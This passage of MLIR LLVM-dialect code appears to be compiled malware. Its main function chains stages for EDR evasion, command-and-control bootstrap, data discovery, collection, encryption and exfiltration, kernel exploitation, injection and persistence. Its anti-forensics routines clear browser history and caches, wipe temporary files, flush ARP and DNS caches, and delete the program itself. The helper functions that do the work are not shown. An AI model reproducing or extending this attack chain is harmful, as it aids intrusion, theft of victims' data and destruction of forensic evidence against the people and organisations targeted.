    %59 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %60 = llvm.call @jocky_clear_browser_cache(%59) : (!llvm.ptr) -> i1
    llvm.cond_br %60, ^bb17, ^bb18
  ^bb17:  // pred: ^bb16
    %61 = llvm.getelementptr %16[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%61) : (!llvm.ptr) -> ()
    llvm.br ^bb18
  ^bb18:  // 2 preds: ^bb16, ^bb17
    %62 = llvm.getelementptr %17[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %63 = llvm.call @jocky_clear_browser_cache(%62) : (!llvm.ptr) -> i1
    llvm.cond_br %63, ^bb19, ^bb20
  ^bb19:  // pred: ^bb18
    %64 = llvm.getelementptr %18[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%64) : (!llvm.ptr) -> ()
    llvm.br ^bb20
  ^bb20:  // 2 preds: ^bb18, ^bb19
    %65 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %66 = llvm.call @jocky_clear_browser_history(%65) : (!llvm.ptr) -> i1
    llvm.cond_br %66, ^bb21, ^bb22
  ^bb21:  // pred: ^bb20
    %67 = llvm.getelementptr %19[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%67) : (!llvm.ptr) -> ()
    llvm.br ^bb22
  ^bb22:  // 2 preds: ^bb20, ^bb21
    %68 = llvm.getelementptr %17[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %69 = llvm.call @jocky_clear_browser_history(%68) : (!llvm.ptr) -> i1
    llvm.cond_br %69, ^bb23, ^bb24
  ^bb23:  // pred: ^bb22
    %70 = llvm.getelementptr %20[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%70) : (!llvm.ptr) -> ()
    llvm.br ^bb24
  ^bb24:  // 2 preds: ^bb22, ^bb23
    %71 = llvm.getelementptr %21[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %72 = llvm.getelementptr %22[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %73 = llvm.call @jocky_wipe_temp_files(%71, %72) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.cond_br %73, ^bb25, ^bb26
  ^bb25:  // pred: ^bb24
    %74 = llvm.getelementptr %23[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    llvm.call @println(%74) : (!llvm.ptr) -> ()
    llvm.br ^bb26
  ^bb26:  // 2 preds: ^bb24, ^bb25
    %75 = llvm.call @forensics_flush_arp_cache() : () -> i32
    %76 = llvm.icmp "sgt" %75, %1 : i32
    llvm.cond_br %76, ^bb27, ^bb28
  ^bb27:  // pred: ^bb26
    %77 = llvm.getelementptr %24[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%77) : (!llvm.ptr) -> ()
    llvm.br ^bb28
  ^bb28:  // 2 preds: ^bb26, ^bb27
    %78 = llvm.call @forensics_clear_dns_cache() : () -> i32
    %79 = llvm.icmp "sgt" %78, %1 : i32
    llvm.cond_br %79, ^bb29, ^bb30
  ^bb29:  // pred: ^bb28
    %80 = llvm.getelementptr %25[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%80) : (!llvm.ptr) -> ()
    llvm.br ^bb30
  ^bb30:  // 2 preds: ^bb28, ^bb29
    %81 = llvm.getelementptr %26[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    llvm.call @jocky_wipe_artifacts(%81) : (!llvm.ptr) -> ()
    %82 = llvm.getelementptr %27[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%82) : (!llvm.ptr) -> ()
    %83 = llvm.getelementptr %28[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<60 x i8>
    llvm.call @println(%83) : (!llvm.ptr) -> ()
    %84 = llvm.getelementptr %29[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%84) : (!llvm.ptr) -> ()
    llvm.return %30 : i1
  }
  llvm.func @phase_self_delete() -> i1 {
    %0 = llvm.mlir.addressof @".str.108" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.109" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.110" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %5 = llvm.mlir.constant(true) : i1
    %6 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%6) : (!llvm.ptr) -> ()
    %7 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%7) : (!llvm.ptr) -> ()
    llvm.call @jocky_self_delete() : () -> ()
    %8 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%8) : (!llvm.ptr) -> ()
    %9 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%9) : (!llvm.ptr) -> ()
    llvm.return %5 : i1
  }
  llvm.func @main() -> i32 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.111" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.112" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.113" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.114" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.115" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.116" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.117" : !llvm.ptr
    %10 = llvm.mlir.constant(true) : i1
    %11 = llvm.mlir.addressof @".str.118" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.119" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.27" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.120" : !llvm.ptr
    %15 = llvm.mlir.addressof @edr_disabled : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.121" : !llvm.ptr
    %17 = llvm.mlir.addressof @kernel_access : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.122" : !llvm.ptr
    %19 = llvm.mlir.addressof @persistence_set : !llvm.ptr
    %20 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %21 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%21) : (!llvm.ptr) -> ()
    %22 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<187 x i8>
    llvm.call @println(%22) : (!llvm.ptr) -> ()
    %23 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<66 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<65 x i8>
    llvm.call @println(%24) : (!llvm.ptr) -> ()
    %25 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<187 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%26) : (!llvm.ptr) -> ()
    %27 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %28 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    %29 = llvm.call @jocky_str_concat(%27, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%29) : (!llvm.ptr) -> ()
    %30 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%30) : (!llvm.ptr) -> ()
    %31 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.call @phase_evasion() : () -> i1
    %33 = llvm.xor %32, %10 : i1
    llvm.cond_br %33, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    llvm.return %0 : i32
  ^bb2:  // pred: ^bb0
    %34 = llvm.call @phase_c2_bootstrap() : () -> i1
    llvm.store %34, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %35 = llvm.call @phase_download_model() : () -> i1
    llvm.store %35, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %36 = llvm.call @phase_discover_data() : () -> i1
    llvm.store %36, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %37 = llvm.call @phase_collect_data() : () -> i1
    llvm.store %37, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %38 = llvm.call @phase_encrypt_data() : () -> i1
    llvm.store %38, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %39 = llvm.call @phase_exfiltrate() : () -> i1
    llvm.store %39, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %40 = llvm.call @phase_kernel_exploit() : () -> i1
    llvm.store %40, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %41 = llvm.call @phase_injection() : () -> i1
    llvm.store %41, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %42 = llvm.call @phase_persistence() : () -> i1
    llvm.store %42, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %43 = llvm.call @phase_anti_forensics() : () -> i1
    llvm.store %43, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %44 = llvm.call @phase_self_delete() : () -> i1
    llvm.store %44, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %45 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%45) : (!llvm.ptr) -> ()
    %46 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    llvm.call @println(%46) : (!llvm.ptr) -> ()
    %47 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %48 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %49 = llvm.call @strlen(%48) : (!llvm.ptr) -> i64
    %50 = llvm.call @string(%49) : (i64) -> !llvm.ptr
    %51 = llvm.call @jocky_str_concat(%47, %50) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %52 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %53 = llvm.call @jocky_str_concat(%51, %52) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%53) : (!llvm.ptr) -> ()
    %54 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %55 = llvm.load %15 {alignment = 1 : i64} : !llvm.ptr -> i1
    %56 = llvm.zext %55 : i1 to i64
    %57 = llvm.call @string(%56) : (i64) -> !llvm.ptr
    %58 = llvm.call @jocky_str_concat(%54, %57) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%58) : (!llvm.ptr) -> ()
    %59 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %60 = llvm.load %17 {alignment = 1 : i64} : !llvm.ptr -> i1
    %61 = llvm.zext %60 : i1 to i64
    %62 = llvm.call @string(%61) : (i64) -> !llvm.ptr
    %63 = llvm.call @jocky_str_concat(%59, %62) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%63) : (!llvm.ptr) -> ()
    %64 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %65 = llvm.load %19 {alignment = 1 : i64} : !llvm.ptr -> i1
    %66 = llvm.zext %65 : i1 to i64
    %67 = llvm.call @string(%66) : (i64) -> !llvm.ptr
    %68 = llvm.call @jocky_str_concat(%64, %67) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%68) : (!llvm.ptr) -> ()
    llvm.return %2 : i32
  }
}
